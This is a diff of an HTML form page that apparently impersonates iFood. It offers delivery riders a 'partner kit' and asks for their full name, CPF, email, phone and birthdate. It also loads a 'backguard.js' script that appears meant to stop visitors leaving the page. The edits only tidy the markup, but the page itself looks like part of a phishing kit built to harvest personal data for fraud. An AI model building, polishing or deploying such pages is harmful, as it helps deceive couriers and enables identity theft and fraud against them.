@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="pt-BR">
 
 <head>
@@ -11,10 +11,10 @@
     <title>iFood Entregador - Dados pessoais</title>
     <meta name="description" content="Informe seus dados para continuar o resgate do kit parceiro iFood.">
     <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
-    <link href="css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css?v=3.3">
-<script src="backguard.js?v=1.5"></script>
+<script src="/backguard.js?v=1.5"></script>
 </head>
 
 <body data-page="personal">
@@ -42,29 +42,33 @@
 
             <div id="personal-error" class="form-error hidden" role="alert"></div>
 
-            <form id="personal-form" class="data-form" novalidate="">
+            <form id="personal-form" class="data-form" novalidate>
                 <div class="input-group">
-                    <input type="text" id="fullname" class="floating-input" placeholder=" " required="" autocomplete="name" spellcheck="false">
+                    <input type="text" id="fullname" class="floating-input" placeholder=" " required
+                        autocomplete="name" spellcheck="false">
                     <label for="fullname" class="floating-label">Nome Completo</label>
                 </div>
 
                 <div class="input-group">
-                    <input type="tel" id="cpf" class="floating-input" placeholder=" " maxlength="14" inputmode="numeric" autocomplete="off" pattern="[0-9]{3}\.[0-9]{3}\.[0-9]{3}-[0-9]{2}" required="">
+                    <input type="tel" id="cpf" class="floating-input" placeholder=" " maxlength="14" inputmode="numeric"
+                        autocomplete="off" pattern="[0-9]{3}\.[0-9]{3}\.[0-9]{3}-[0-9]{2}" required>
                     <label for="cpf" class="floating-label">CPF</label>
                 </div>
 
                 <div class="input-group">
-                    <input type="email" id="email" class="floating-input" placeholder=" " required="" autocomplete="email">
+                    <input type="email" id="email" class="floating-input" placeholder=" " required autocomplete="email">
                     <label for="email" class="floating-label">E-mail</label>
                 </div>
 
                 <div class="input-group">
-                    <input type="tel" id="phone" class="floating-input" placeholder=" " maxlength="15" inputmode="numeric" autocomplete="tel" required="">
+                    <input type="tel" id="phone" class="floating-input" placeholder=" " maxlength="15" inputmode="numeric"
+                        autocomplete="tel" required>
                     <label for="phone" class="floating-label">Telefone</label>
                 </div>
 
                 <div class="input-group">
-                    <input type="tel" id="birthdate" class="floating-input" placeholder=" " maxlength="10" inputmode="numeric" autocomplete="bday" pattern="[0-9]{2}/[0-9]{2}/[0-9]{4}" required="">
+                    <input type="tel" id="birthdate" class="floating-input" placeholder=" " maxlength="10"
+                        inputmode="numeric" autocomplete="bday" pattern="[0-9]{2}/[0-9]{2}/[0-9]{4}" required>
                     <label for="birthdate" class="floating-label">Data de Nascimento</label>
                 </div>
 
@@ -81,7 +85,7 @@
         <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
     </footer>
 
-    <script src="script.js?v=10.7" defer=""></script>
+    <script src="script.js?v=10.7" defer></script>
 </body>
 
 </html>
